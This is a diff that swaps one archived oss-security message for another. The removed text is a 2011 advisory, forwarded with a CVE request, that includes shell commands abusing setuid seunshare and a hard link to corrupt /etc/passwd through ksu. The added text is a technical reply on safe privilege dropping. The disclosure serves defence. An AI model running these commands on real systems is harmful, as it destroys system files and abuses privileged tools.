@@ -1,135 +1,65 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/02/23/1
-Message-ID: <AANLkTikU=whg384HmvbPcAgDjP_KMqJQ1TGFPz1B081g@mail.gmail.com>
-Date: Tue, 22 Feb 2011 18:33:32 -0700
-From: Kurt Seifried <kurt@...fried.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/09/05/1
+Message-ID: <20110905012403.GC31987@openwall.com>
+Date: Mon, 5 Sep 2011 05:24:03 +0400
+From: Solar Designer <solar@...nwall.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE Request
+Subject: Re: [Pkg-xfce-devel] Bug#639151: Bug#639151: Bug#639151: Local privilege escalation
 Content-Type: text/plain; charset=utf-8
 
-Can we get a CVE # for this please and thank you.
+On Mon, Aug 29, 2011 at 01:40:16PM +0200, Yves-Alexis Perez wrote:
+> By the way, would you know some kind of lib for ???safe privileges
+> dropping??? for that kind of usage. I quickly looked at glib and while
+> they do have some primitives for process spawning, there's nothing
+> related to dropping privs. It looks like something which might be
+> useful.
 
--Kurt
+No, I am not aware of a generic library with functionality like that.
 
-From: 	Tavis Ormandy   	2/22/11 6:01 PM 	  	
-To: 	full-disclosure@...ts.grok.org.uk
-Subject: 	[Full-disclosure] Developers should not rely on the
-stickiness of/tmp on Red Hat Linux
-Developers should not rely on the stickiness of /tmp on Red Hat Linux
----------------------------------------------------------------------
+Additionally, while effective credentials switching for accessing users'
+files feels like the obvious best thing to do in a program, things are
+less obvious when you need to do that from a library.  One issue is
+threads.  Switching only fsuid/fsgid/groups or switching
+euid/egid/groups with direct kernel syscalls (not thread-aware at least
+on Linux) rather than with library functions (thread-aware at least on
+glibc) helps with this (but is non-portable or makes assumptions).
+But then what about signals?  Signal handlers installed by the main
+program or by other libraries may not expect to be invoked with
+temporarily changed effective credentials.  Should our library block all
+signals before it switches credentials, then unblock after it has
+restored the old credentials?  Maybe.  But this does get complicated,
+dirty, risky.
 
-Recent versions of Red Hat Enterprise Linux and Fedora provide seunshare, a
-setuid root utility from policycore-utils intended to make new filesystem
-namespaces available to unprivileged processes for the purpose of sandboxing.
+To give credit where it's due, the above concern regarding signals
+originates (for me) from an off-list discussion I had with Rich Felker -
+the author of musl, a new lightweight libc for Linux:
 
-The intention is to permit unprivileged users to mount a new temporary
-directory on /home and /tmp for sandboxed processes, thus preventing
-access to the contents of the original directories in the event of a
-compromise.
+http://www.etalabs.net/musl/
 
-One unintended side effect of making these features available to unprivileged
-processes is that users can now change how setuid applications perceive /tmp
-and /home.
+In Openwall's "tcb suite" (specifically, in libtcb, which is used by
+libnss_tcb), we switch fsuid/fsgid/groups before accessing
+/etc/tcb/*/shadow files, because the /etc/tcb/* directories have users
+as their owners:
 
-The purpose of this advisory is to inform developers and system administrators
-of affected systems that unprivileged users can effectively remove the
-sticky-bit from the system /tmp directory, and thus relying on the stickiness
-of /tmp on redhat systems is no longer safe.
+http://www.openwall.com/tcb/
 
-This advisory is intended for system administrators and developers of
-Red Hat Linux systems; journalists, end users and other non-technical
-readers do not need to be concerned.
+We don't block/unblock signals.
 
---------------------
-Affected Software
-------------------------
+musl supports our tcb password shadowing scheme too, but instead of
+credential switching, it takes precautions when accessing those files as
+root.  Either approach has its pros and cons.  I've already mentioned
+the signals issue with credential switching.  And an issue with trying
+to access files as root safely is that even when you do everything you
+can, a race condition remains: an attacker may replace the file to read
+with a hard link to a tape device, which would rewind the tape on
+open(2).  (There might be other devices with side-effects on open, too.)
+Arguably, this is purely theoretical and thus acceptable.  I'd say it's
+more acceptable when accessing /etc/tcb/*/shadow than when accessing
+dot-files in a user's home directory, because /etc/tcb (this directory
+itself) is normally root:shadow, mode 710, so it'd take a group shadow
+compromise before this DoS attack may be attempted.
 
-All known versions of policycore-utils are affected.
+I hope these examples are helpful, and I hope you don't mind me plugging
+these two pieces of software. ;-)
 
-I discussed the potentially dangerous implications of introducing this change
-with Red Hat Security in September 2010, but FC14 and RHEL6 still exhibit this
-behaviour post-launch.
-
---------------------
-Consequences
------------------------
-
-A simple example of a common application that is now unsafe is ksu, from the
-krb5 distribution. ksu creates a temporary file in /tmp, then clears it on
-authentication failure.
-
-This is normally a safe operation, as /tmp is protected by the sticky bit.
-
-However, we can use seunshare to interfere with this process.
-
-# create a new directory that we control
-$ mkdir /tmp/seunshare
-
-# use seunshare to mount it on /tmp and /home and run our setuid root binary
-$ seunshare -v -t /tmp/seunshare/ -h /tmp/seunshare/ -- `which ksu`
-root &>/dev/null &
-[1]+ Stopped seunshare -v -t /tmp/seunshare/ -h /tmp/seunshare/ --
-`which ksu` root
-
-# we can examine the mounts visible to the process using the /proc interface
-$ grep /tmp /proc/$(pidof ksu)/mountinfo
-66 64 1:1 /tmp/seunshare /tmp
-
-# here is the temporary file created by ksu during authentication
-$ ls -l /tmp/seunshare/
-total 4.0K
--rw-------. 1 root taviso 35 Feb 18 23:21 krb5cc_0.1
-
-# as we own the directory, and the sticky-bit is not set, we are permitted to
-# unlink files
-$ rm -f /tmp/seunshare/krb5cc_0.1
-
-# now we can replace the file with a link
-$ ln /etc/passwd /tmp/seunshare/krb5cc_0.1
-
-# make ksu authentication fail.
-$ fg
-seunshare -v -t /tmp/seunshare/ -h /tmp/seunshare/ -- `which ksu` root
-
-And /etc/passwd was damaged, thus breaking the system.
-
--------------------
-Credit
------------------------
-
-This bug was discovered by Tavis Ormandy.
-
--------------------
-Greetz
------------------------
-
-Thanks to Kees, Hawkes, Dan and Julien for their help. Greetz to everyone in
-$1$kk1q85Xp$Id.gAcJOg7uelf36VQwJQ/, and all my other elite friends and
-colleagues.
-
--------------------
-Notes
------------------------
-
-Although only an example of damaging a system has been provided, it's
-reasonable to assume that various applications rely on the stickiness of
-/tmp to prevent code execution.
-
-Administrators are advised to remove the setuid bit from seunshare, or
-restrict access to it.
-
--------------------
-References
------------------------
-
-None.
-
--- 
--------------------------------------
-taviso@...xchg8b.com | pgp encrypted mail preferred
--------------------------------------------------------
-
-_______________________________________________
-Full-Disclosure - We believe in it.
-Charter: http://lists.grok.org.uk/full-disclosure-charter.html
-Hosted and sponsored by Secunia - http://secunia.com/
+Alexander
